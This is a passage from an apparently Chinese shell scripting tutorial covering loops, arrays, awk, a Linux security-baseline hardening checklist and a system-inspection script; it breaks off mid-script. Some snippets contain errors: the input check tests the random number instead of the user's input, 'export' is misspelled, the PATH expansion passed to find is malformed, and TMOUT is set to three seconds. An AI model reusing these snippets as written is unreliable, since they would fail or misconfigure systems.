<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span>((i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++))
<span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>案例</strong>：使用for循环在/liux目录下通过随机小写10个字母加固定字符串liux批量创建10个html文件</p>
<ul>
<li>
<p>例如：apquvdpqbk_liux.html</p>
</li>
<li>
<p>生成随机数</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#1.</span>
uuidgen
<span class="hljs-comment">#2. -l密码长度，-d数字数量，-s special 特殊字符 -C 大写字母 -c小写字母</span>
mkpasswd -l 10 -d 0 -s 0 -C 0

<span class="hljs-comment">#3.-c取反，-d删除 /dev/urandom 字符设备，生成随机字符</span>
<span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">'a-z'</span> &lt;/dev/urandom |<span class="hljs-built_in">head</span> -c 10
<span class="hljs-comment">#4.%N纳秒</span>
<span class="hljs-built_in">date</span> +%N |<span class="hljs-built_in">md5sum</span>
<span class="hljs-comment">#5</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$RANDOM</span>
</code></pre>
<ul>
<li>代码</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 09.touch_files.sh</span>

<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment">#1.vars</span>
<span class="hljs-built_in">dir</span>=/liux

<span class="hljs-comment">#2.检查</span>
[ ! -d <span class="hljs-variable">$dir</span> ] &amp;&amp; <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$dir</span>

<span class="hljs-comment">#3.for循环</span>

<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> {1..10}
<span class="hljs-keyword">do</span>
  file_name_pre=`<span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">'a-z'</span> &lt;/dev/urandom |<span class="hljs-built_in">head</span> -c 10`
  file_name_full=<span class="hljs-variable">${file_name_pre}</span>_liux.html
  <span class="hljs-built_in">touch</span> <span class="hljs-variable">${dir}</span>/<span class="hljs-variable">${file_name_full}</span>
<span class="hljs-keyword">done</span>

</code></pre>
<h4 data-id="heading-32">2.while循环</h4>
<ul>
<li>加入条件</li>
<li>死循环</li>
<li>读取文件</li>
</ul>
<h5 data-id="heading-33">2.1while循环通用格式</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">while</span> 条件
<span class="hljs-keyword">do</span>
     命令
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#温馨提示： while循环只会在满足条件后运行</span>
</code></pre>
<h5 data-id="heading-34">2.2案例：生成随机数，判断数字是什么</h5>
<ul>
<li>
<p>如果输入的数字比随机数大,提示大了,</p>
</li>
<li>
<p>如果输入数字比随机数小,提示小了,</p>
</li>
<li>
<p>如果等于提示恭喜</p>
</li>
<li>
<p>额外要求:</p>
<ul>
<li>
<p>用了1-3次 超越了99.99%人</p>
</li>
<li>
<p>用了4-6次 超越80%的人</p>
</li>
<li>
<p>其他 超越了70%的人</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 10.guess_num.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#1.vars</span>
num_rand=$(( RANDOM%<span class="hljs-number">100</span> ))
i=1

<span class="hljs-comment">#2.检查输入的是否为数字</span>
<span class="hljs-function"><span class="hljs-title">num_check</span></span>() {
  [[ <span class="hljs-variable">$num_rand</span> =~ ^[0-9]+$ ]] || {
    <span class="hljs-built_in">echo</span> “请输入数字”
    <span class="hljs-built_in">continue</span>
  }
}

<span class="hljs-comment">#3.排名功能</span>
<span class="hljs-function"><span class="hljs-title">ranking</span></span>() {
  cnt=$((i-<span class="hljs-number">1</span>))
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$cnt</span> -le 3 ];<span class="hljs-keyword">then</span>
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜您，使用了<span class="hljs-variable">$cnt</span>次，超越了99.99%的用户"</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$cnt</span> -ge 4 -a <span class="hljs-variable">$cnt</span> -le 6 ];<span class="hljs-keyword">then</span>
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜您，使用了<span class="hljs-variable">$cnt</span>次，超越了80%的用户"</span>
  <span class="hljs-keyword">else</span>
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜您，使用了<span class="hljs-variable">$cnt</span>次,超越了70%的用户"</span>
  <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment">#4.用户输入数字，判断</span>
<span class="hljs-function"><span class="hljs-title">input_num_compare</span></span>() {
  <span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入数字"</span> num
  num_check
  <span class="hljs-built_in">let</span> i++
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$num</span> -gt <span class="hljs-variable">$num_rand</span> ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"很抱歉，猜大了"</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$num</span> -lt <span class="hljs-variable">$num_rand</span> ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"很抱歉，猜小了"</span>
  <span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜猜对了"</span>
    ranking
    <span class="hljs-built_in">exit</span>
  <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment">#5.书写主函数</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>
<span class="hljs-keyword">do</span>
  input_num_compare
<span class="hljs-keyword">done</span>
}
main
</code></pre>
<ul>
<li>while循环-读取文件内容
<ul>
<li>需要在脚本中读取文件内容，多行。此时可以选择3剑客或while循环</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#方式1：采用exec读取文件后，然后进入while循环处理。</span>
<span class="hljs-built_in">exec</span>&lt;FILE
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
<span class="hljs-keyword">do</span>
   cmd
    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#方式2：使用cat读取文件内容，然后通过管道进入 不适用于有变量传递场景使用。</span>
<span class="hljs-built_in">cat</span> FILE|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
<span class="hljs-keyword">do</span>
   cmd
   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#方式3：在while循环结尾done通过输入重定向指定读取的文件。 推荐使用</span>
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
<span class="hljs-keyword">do</span>
   cmd
<span class="hljs-keyword">done</span>&lt;FILE
</code></pre>
<h4 data-id="heading-35">3.do-until循环</h4>
<ul>
<li>无论条件是否满足，都会执行一次</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#直到型循环: 一直循环,直到条件不满足.</span>
until 条件
<span class="hljs-keyword">do</span>
   命令
   命令
   ....
<span class="hljs-keyword">done</span>
until 话费是否充足
<span class="hljs-keyword">do</span>
   发短信
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#先执行，再判断条件是否满足</span>
</code></pre>
<h4 data-id="heading-36">4.循环控制语句</h4>






























<table><thead><tr><th>语句</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>exit</td><td>终止执行脚本,退出返回值</td><td>脚本结束加上exit</td></tr><tr><td>return</td><td>放在函数中,终止执行函数,函数返回值</td><td>写在函数中，检查函数命令运行是否成功</td></tr><tr><td><strong>break</strong></td><td>终止循环（退出）</td><td>需要在循环中退出循环</td></tr><tr><td><strong>continue</strong></td><td>终止（跳过）本次循环，进入下一次循环</td><td>要在循环中跳过某一次循环</td></tr></tbody></table>
<h3 data-id="heading-37">四、shell编程-辅助功能</h3>
<ul>
<li>颜色</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> {30..48};<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\E[1;<span class="hljs-variable">${n}</span>mliux\E[0m"</span> ; <span class="hljs-keyword">done</span>
</code></pre>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#创建环境变量或写入脚本开头</span>
<span class="hljs-built_in">export</span> RED=<span class="hljs-string">"\E[5;31m"</span>
<span class="hljs-built_in">export</span> GREEN=<span class="hljs-string">"\E[1;32m"</span>
<span class="hljs-built_in">export</span> BLUE=<span class="hljs-string">"\E[1;34m"</span>
<span class="hljs-built_in">export</span> END=<span class="hljs-string">"\E[0m"</span>
<span class="hljs-comment">#永久使用/etc/profile中即可</span>

<span class="hljs-comment">#写为函数</span>
<span class="hljs-function"><span class="hljs-title">redecho</span></span>() {
  <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[5;31m"</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[0m"</span>
  <span class="hljs-comment">#echo -e "\e[5;31m $@ \e[0m"</span>
}
<span class="hljs-function"><span class="hljs-title">greenecho</span></span>() {
  <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[1;32m"</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[0m"</span>
}
<span class="hljs-function"><span class="hljs-title">blueecho</span></span>() {
  <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[1;34m"</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[0m"</span>
}
</code></pre>
<h3 data-id="heading-38">五、shell编程-数组</h3>
<pre><code class="hljs language-sh" lang="sh">names=(web01 web02 db01 nfs01 backup)
<span class="hljs-keyword">for</span> n  <span class="hljs-keyword">in</span>  <span class="hljs-variable">${names[@]}</span>
<span class="hljs-keyword">do</span>
     ping -c 1 -W 1  <span class="hljs-variable">$n</span>  
<span class="hljs-keyword">done</span>
</code></pre>
<ul>
<li>shell数组赋值</li>
</ul>

















<table><thead><tr><th>赋值</th><th/></tr></thead><tbody><tr><td>直接赋值</td><td>array=(ip01 ip02 ip03 ip04 )<br/>array=( <code>cat ip.txt</code>) #cat ip.txt 三剑客命令获取指定内容</td></tr><tr><td>read命令赋值</td><td>read -a -p "输入数组中内容:" array 可以创建数组,空格分割即可</td></tr></tbody></table>
<ul>
<li>案例：从键盘输入10个整数，求和、平均数。</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 11.read_sum.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#0.vars</span>
. ./func.sh
<span class="hljs-built_in">sum</span>=0
avg=0
i=1
tmp_file=/tmp/num.txt

<span class="hljs-comment">#1.初始化，判断文件是否存在</span>
<span class="hljs-function"><span class="hljs-title">init</span></span>() {
  [ -f <span class="hljs-variable">$tmp_file</span> ] &amp;&amp; <span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$tmp_file</span>
  <span class="hljs-built_in">return</span> $?
}

<span class="hljs-comment">#2.读取用户输入</span>
<span class="hljs-function"><span class="hljs-title">read_num</span></span>() {
  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>
<span class="hljs-keyword">do</span>
  [ <span class="hljs-variable">$i</span> -gt 10 ] &amp;&amp; <span class="hljs-built_in">break</span>
  <span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入第<span class="hljs-variable">${i}</span>个数字："</span> num
  [[ <span class="hljs-string">"<span class="hljs-variable">$num</span>"</span> =~ ^[0-9]+$ ]] || <span class="hljs-built_in">continue</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$num</span> &gt;&gt;<span class="hljs-variable">$tmp_file</span>
  <span class="hljs-built_in">let</span> i++
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">return</span> $?
}

<span class="hljs-comment">#3.进行计算</span>
<span class="hljs-function"><span class="hljs-title">num_calc</span></span>() {
  num_array=(`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$tmp_file</span>`)
  <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-variable">${num_array[@]}</span>
  <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">let</span> <span class="hljs-built_in">sum</span>+=num
  <span class="hljs-keyword">done</span>
  <span class="hljs-built_in">return</span> $?
}

<span class="hljs-comment">#4.输出总和与平均数</span>
<span class="hljs-function"><span class="hljs-title">num_print</span></span>() {
  avg=`<span class="hljs-built_in">echo</span> <span class="hljs-string">"scale=2;<span class="hljs-variable">$sum</span>/10"</span>|bc -l`
  rc=$?
  blueecho <span class="hljs-string">"用户输入的数字有：<span class="hljs-variable">${num_array[@]}</span>"</span>
  greenecho <span class="hljs-string">"10个数字的总和是<span class="hljs-variable">$sum</span>,平均数是<span class="hljs-variable">$avg</span>"</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-comment">#5.主函数</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  init
  read_num
  num_calc
  num_print
}

main
</code></pre>
<h3 data-id="heading-39">六、shell编程-debug全流程</h3>
<h4 data-id="heading-40">1.书写习惯</h4>
<ul>
<li>注释</li>
<li>变量：在脚本中尽量使用变量，变量命令规范，给变量加上注释</li>
<li>函数：代码中尽可能使用函数，增加说明</li>
<li>返回值：尽可能增加函数return功能，方便后期调试</li>
<li>参数与选项检查：尽可能增加exit 返回值的功能，方便后期调试</li>
<li>输出：书写代码的时候，可以多写一些echo用于在某些步骤中进行输出</li>
<li>缩进：代码注意缩进</li>
</ul>
<h4 data-id="heading-41">2.调试方法</h4>
<ul>
<li>-x    大部分情况使用      显示详细的执行过程</li>
<li>精确显示执行过程
<ul>
<li>set    -x   开启显示执行过程</li>
<li>set    +x  关闭显示箱子过程</li>
</ul>
</li>
<li>注释法</li>
<li>输出关键变量</li>
</ul>
<h3 data-id="heading-42">七、再战三剑客</h3>
<h4 data-id="heading-43">1.sed与变量</h4>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">cat</span> ip.txt
10.0.0.5
10.0.0.6
10.0.0.7
src=10.0.0
dst=172.16.1
sed <span class="hljs-string">"s#<span class="hljs-variable">$src</span>#<span class="hljs-variable">$dst</span>#g"</span> ip.txt
172.16.1.5
172.16.1.6
172.16.1.7
</code></pre>
<h4 data-id="heading-44">2.awk判断</h4>
<pre><code class="hljs language-sh" lang="sh"> awk <span class="hljs-string">'{if(NR&lt;=5){print $0}}'</span> /etc/passwd
 awk <span class="hljs-string">'{
       if(NR&lt;=5){
          print $0
        }
 }'</span> /etc/passwd
 
</code></pre>
<h4 data-id="heading-45">3.awk循环</h4>
<pre><code class="hljs language-sh" lang="sh">awk <span class="hljs-string">'BEGIN{for(i=1;i&lt;=100;i++) {sum=sum+i} print sum }'</span>
</code></pre>
<h4 data-id="heading-46">4.awk数组</h4>
<ul>
<li>awk数组专用于统计与分析
<ul>
<li>去重统计次数</li>
<li>去重求和</li>
</ul>
</li>
<li>awk数组与shell数组区别
<ul>
<li>awk数组：关联数组，下标啥都行</li>
<li>shell数组：普通数组，下标数字,shell中也有关联数组</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">awk <span class="hljs-string">'BEGIN{array[0]="lidao996";array["lidao"]=996;array[110]="sos"; print array[0]}'</span>
</code></pre>
<ul>
<li>awk专用于数组的循环</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span>(n  <span class="hljs-keyword">in</span> 数组名字)
   <span class="hljs-built_in">print</span> n(数组下标),数组名字[n]
         数组下标    对应的值
</code></pre>
<pre><code class="hljs language-sh" lang="sh">vim awk-array.txt
url               次数
img.oldboylinux.cn 6
bbs.oldboylinux.cn 7
avi.oldboylinux.cn 99
mp4.oldboylinux.cn 88

<span class="hljs-comment">#以url为下标，次数为元素值的数组，输出内容</span>
awk <span class="hljs-string">'NR&gt;1{array[$1]=$2}END{ for( url in array) print url,array[url] }'</span> awk-array.txt
</code></pre>
<ul>
<li>去重统计次数</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"> vim url.txt
http://www.etiantian.org/index.html
http://www.etiantian.org/1.html
http://post.etiantian.org/index.html
http://mp3.etiantian.org/index.html
http://www.etiantian.org/3.html
http://post.etiantian.org/2.html


awk -F<span class="hljs-string">'/+'</span> <span class="hljs-string">'{url[$2]=url[$2]+1}END{for(name in url) print name,url[name]}'</span> url.txt
</code></pre>
<h3 data-id="heading-47">八、shell编程-安全基线检查脚本</h3>
<h4 data-id="heading-48">1.身份鉴权</h4>
<h5 data-id="heading-49">1.1配置口令复杂度</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#默认格式</span>
[root@m01 ~]<span class="hljs-comment"># grep pwquality /etc/pam.d/system-auth</span>
password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=

<span class="hljs-comment">#修改</span>
vim /etc/pam.d/system-auth
password requisite pam_pwquality.so try_first_pass local_users_only retry=3 difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 authtok_type=
<span class="hljs-comment">#root用户也使用</span>
enforce_for_root

<span class="hljs-comment">#检查有没有配置密码复杂度</span>
egrep -o <span class="hljs-string">'minlen|[uld]credit'</span> /etc/pam.d/system-auth |<span class="hljs-built_in">wc</span> -l
</code></pre>
<blockquote>
<p>minlen=8 至少8位</p>
<p>ucredit=-1 upper 大写字母 -号表示至少-1位 3 最多3位</p>
<p>lcredit=-1 lower 小写字母 -号表示至少-1位</p>
<p>dcredit=-1 digit 数字 -号表示至少-1</p>
<p>difok=3 与上个密码重复的内容</p>
<p>enforce_for_root 也限制root修改密码</p>
</blockquote>
<h5 data-id="heading-50">1.2设置口令认证失败锁定次数</h5>
<pre><code class="hljs language-sh" lang="sh">vim /etc/pam.d/system-auth
<span class="hljs-comment">#auth是属于认证部分</span>
auth required pam_tally2.so onerr=fail deny=3 unlock_time=20

<span class="hljs-comment">#注：解锁用户 pam_tally2 -u liux --reset</span>
<span class="hljs-comment">#温馨提示: 这个规则放在最上面.</span>
<span class="hljs-comment">#如果需要root 也错误并锁定则增加even_deny_root即可</span>

<span class="hljs-comment">#检查是否配置</span>
grep pam_tally2.so /etc/pam.d/system-auth |egrep -o <span class="hljs-string">'deny=|unlock_time='</span> |<span class="hljs-built_in">wc</span> -l
</code></pre>
<h5 data-id="heading-51">1.3配置口令生存周期</h5>
<ul>
<li>是否配置新用户的密码过期</li>
<li>检查是否最近30天有用户密码要过期</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#新用户</span>
<span class="hljs-comment">#建议在/etc/login.defs文件中配置：</span>

PASS_MAX_DAYS 90 <span class="hljs-comment">#新建用户的密码最长使用天数</span>
PASS_MIN_DAYS 0 <span class="hljs-comment">#新建用户的密码最短使用天数</span>
PASS_WARN_AGE 7 <span class="hljs-comment">#新建用户的密码到期提前提醒天数</span>

<span class="hljs-comment">#命令修改已经存在的用户过期时间  -x最长使用天数  -w 过期提醒7天前</span>
passwd -x 90 -n 0 -w 7 liux

<span class="hljs-comment">#检查</span>
chage -l liux

awk <span class="hljs-string">'/^PASS_MAX_DAYS/{print $2}'</span> /etc/login.defs 或者
grep <span class="hljs-string">"^PASS_MAX_DAYS"</span> /etc/login.defs |awk <span class="hljs-string">'{print $NF}'</span>

awk <span class="hljs-string">'/^PASS_WARN_AGE/{print $2}'</span> /etc/login.defs

<span class="hljs-comment">#密码过期判断</span>
<span class="hljs-comment">#1. 可以登录系统 /bin/bash</span>
awk -F: <span class="hljs-string">'$NF=="/bin/bash" {print $1}'</span> /etc/passwd
<span class="hljs-comment">#2. 获取用户密码过期时间chage -l 用户名看</span>
chage -l root
<span class="hljs-comment">#3. 过期时间与当前时间相减 (秒)</span>
<span class="hljs-comment">#4. 转换为天 与30天对比</span>
<span class="hljs-comment">#5. 与30对比即可</span>
</code></pre>
<h5 data-id="heading-52">1.4配置使用ssh方式远程访问</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#使用ssh远程连接,禁用telnet</span>
<span class="hljs-comment">#检查点检查服务是否运行或开启即可.</span>
telnet <span class="hljs-comment">#方式关闭</span>
ssh <span class="hljs-comment">#方式开启</span>
[root@lb01 ~]<span class="hljs-comment"># systemctl is-active sshd telnet</span>
active
unknown
</code></pre>
<h5 data-id="heading-53">1.5配置历史口令使用策略</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#最近5次的密码不能相同</span>
password requisite pam_pwhistory.so remember=5

</code></pre>
<h4 data-id="heading-54">2.访问控制</h4>
<h5 data-id="heading-55">2.1锁定无关用户</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#不用的用户,锁定,注释</span>

<span class="hljs-comment">#lock (root)</span>
passwd -l
<span class="hljs-comment">#解锁 (root)</span>
passwd -u
<span class="hljs-comment">#通过</span>
passwd -S 用户名查看是否锁定
/etc/shadow 第2列是否!!叹号
<span class="hljs-comment">#可以注释掉用户.</span>
lp nuucp hpdb <span class="hljs-built_in">sync</span> adm ftp games
</code></pre>
<h5 data-id="heading-56">2.2清楚uid为0的非root用户</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#检查是否存在 是否有uid是0 用户名不是root的用户.</span>
awk -F: <span class="hljs-string">'$3==0 &amp;&amp; $1!="root" {print $1}'</span> /etc/passwd 
</code></pre>
<h5 data-id="heading-57">2.3控制为授权的suid/sgid</h5>
<ul>
<li>取PATH变量存放的目录中的命令</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#-perm 按照文件权限查找</span>
find <span class="hljs-variable">${PATH//:/}</span> /tmp/ -perm /+s 2&gt;/dev/null |xargs <span class="hljs-built_in">ls</span> -ld --color
</code></pre>
<h5 data-id="heading-58">2.4控制任何人都有写权限的目录</h5>
<ul>
<li>o上有w的目录</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">find / -<span class="hljs-built_in">type</span> d -perm /o+w |xargs <span class="hljs-built_in">ls</span> -ld
</code></pre>
<h5 data-id="heading-59">2.5控制任何人都有写权限的文件</h5>
<ul>
<li>o上有w的文件</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">find / -<span class="hljs-built_in">type</span> f -perm /o+w 2&gt;/dev/null |egrep -v <span class="hljs-string">"^/sys|^/proc"</span> |<span class="hljs-built_in">wc</span> -l
</code></pre>
<h5 data-id="heading-60">2.6删除没有属主的文件</h5>
<pre><code class="hljs language-sh" lang="sh">find / -nouser -o -nogroup 2&gt;/dev/null |<span class="hljs-built_in">wc</span> -l
</code></pre>
<h5 data-id="heading-61">2.7控制异常或隐藏文件</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#查找以点开始的文件</span>
find / -name <span class="hljs-string">".*"</span> |xargs <span class="hljs-built_in">ls</span> -ld
</code></pre>
<h4 data-id="heading-62">3.安全审计</h4>
<h5 data-id="heading-63">3.1配置使用ntp</h5>
<pre><code class="hljs language-sh" lang="sh">ntpdate ntp1.aliyun.com
</code></pre>
<h4 data-id="heading-64">4.入侵防护</h4>
<h5 data-id="heading-65">4.1配置登录超时自动退出</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> TMOUT=3
epxort HISTSIZE=10
<span class="hljs-built_in">export</span> HISTFILESIZE=10
</code></pre>
<h5 data-id="heading-66">4.2限制root账户远程登录</h5>
<pre><code class="hljs language-sh" lang="sh">PermitRootLogin no
</code></pre>
<h3 data-id="heading-67">九、脚本汇总</h3>
<h4 data-id="heading-68">1.系统巡检脚本</h4>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim sys_info.sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:sys_info.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:系统巡检基本脚本</span>
<span class="hljs-comment">########################################################</span>

. /server/scripts/devops-shell/func.sh

<span class="hljs-comment">#1.基础信息</span>
<span class="hljs-function"><span class="hljs-title">base_info</span></span>() {
  hostname=`hostname`
  ip=`hostname -I`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########基本信息##############"</span>
  greenecho <span class="hljs-string">"主机名：<span class="hljs-variable">$hostname</span>"</span>
  greenecho <span class="hljs-string">"ip地址：<span class="hljs-variable">$ip</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
} 

<span class="hljs-comment">#2.负载</span>
<span class="hljs-function"><span class="hljs-title">load_info</span></span>() {
  load1=`<span class="hljs-built_in">uptime</span> |awk -F<span class="hljs-string">'[ ,]+'</span> <span class="hljs-string">'{print $(NF-2)}'</span>`
  load5=`<span class="hljs-built_in">uptime</span> |awk -F<span class="hljs-string">'[ ,]+'</span> <span class="hljs-string">'{print $(NF-1)}'</span>`
  load15=`<span class="hljs-built_in">uptime</span> |awk -F<span class="hljs-string">'[ ,]+'</span> <span class="hljs-string">'{print $NF}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########负载信息##############"</span>
  greenecho <span class="hljs-string">"最近1分钟负载：<span class="hljs-variable">$load1</span>"</span>
  greenecho <span class="hljs-string">"最近5分钟负载：<span class="hljs-variable">$load5</span>"</span>
  greenecho <span class="hljs-string">"最近15分钟负载：<span class="hljs-variable">$load15</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#3.内存</span>
<span class="hljs-function"><span class="hljs-title">mem_info</span></span>() {
  mem_total=`free -h |awk <span class="hljs-string">'NR==2{print $2}'</span>`
  mem_used=`free -h  |awk <span class="hljs-string">'NR==2{print ($3+$6)}'</span>`
  mem_used_percent=`free |awk <span class="hljs-string">'NR==2{print ($3+$6)/$2*100"%"}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########内存信息##############"</span>
  greenecho <span class="hljs-string">"总计内存：<span class="hljs-variable">$mem_total</span>"</span>
  greenecho <span class="hljs-string">"已用内存：<span class="hljs-variable">${mem_used}</span>M"</span>
  greenecho <span class="hljs-string">"内存使用率：<span class="hljs-variable">$mem_used_percent</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#4.swap</span>
<span class="hljs-function"><span class="hljs-title">swap_info</span></span>() {
  swap_total=`free -h |awk <span class="hljs-string">'NR==3{print $2}'</span>`
  swap_used=`free -h  |awk <span class="hljs-string">'NR==3{print ($3+$6)}'</span>`
  swap_used_percent=`free |awk <span class="hljs-string">'NR==3{print ($3+$6)/$2*100"%"}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########swap信息##############"</span>
  greenecho <span class="hljs-string">"总计swap：<span class="hljs-variable">$swap_total</span>"</span>
  greenecho <span class="hljs-string">"已用swap：<span class="hljs-variable">${swap_used}</span>M"</span>
  greenecho <span class="hljs-string">"swap使用率：<span class="hljs-variable">$swap_used_percent</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#5.磁盘</span>

<span class="hljs-function"><span class="hljs-title">disk_info</span></span>() {
  disk_total=`fdisk -l |grep <span class="hljs-string">'/dev/[sv]d[a-z][:：]'</span> |<span class="hljs-built_in">wc</span> -l`
  root_size=`<span class="hljs-built_in">df</span> -h | awk <span class="hljs-string">'$NF=="/"{print $2}'</span>`
  root_used_percent=`<span class="hljs-built_in">df</span> -h | awk <span class="hljs-string">'$NF=="/"{print $(NF-1)}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########磁盘信息##############"</span>
  greenecho <span class="hljs-string">"总计硬盘个数：<span class="hljs-variable">$disk_total</span>"</span>
  greenecho <span class="hljs-string">"根分区大小：<span class="hljs-variable">${root_size}</span>"</span>
  greenecho <span class="hljs-string">"根分区使用率：<span class="hljs-variable">$root_used_percent</span>"</span>
  blueecho  <span class="hljs-string">"#################################"</span>
}

<span class="hljs-comment">#6.进程</span>
<span class="hljs-function"><span class="hljs-title">proc_info</span></span>() {
  proc_total=`top -bn1 |awk <span class="hljs-string">'NR==2{print $2}'</span>`
  proc_running=`top -bn1 |awk <span class="hljs-string">'NR==2{print $4}'</span>`
  proc_stopped=`top -bn1 |awk <span class="hljs-string">'NR==2{print $8}'</span>`
  proc_zombie=`top -bn1 |awk <span class="hljs-string">'NR==2{print $10}'</span>`
  blueecho  <span class="hljs-string">"#################################"</span>
  blueecho  <span class="hljs-string">"###########进程信息##############"</span>
  greenecho <span class="hljs-string">"进程总数：<span class="hljs-variable">$proc_total</span>"</span>
  greenecho <span class="hljs-string">"正在运行的进程数：<span class="hljs-variable">${proc_running}</span>"</span>
  greenecho <span class="hljs-string">"挂起的进程数：<span class="hljs-variable">$proc_stopped</span>"</span>
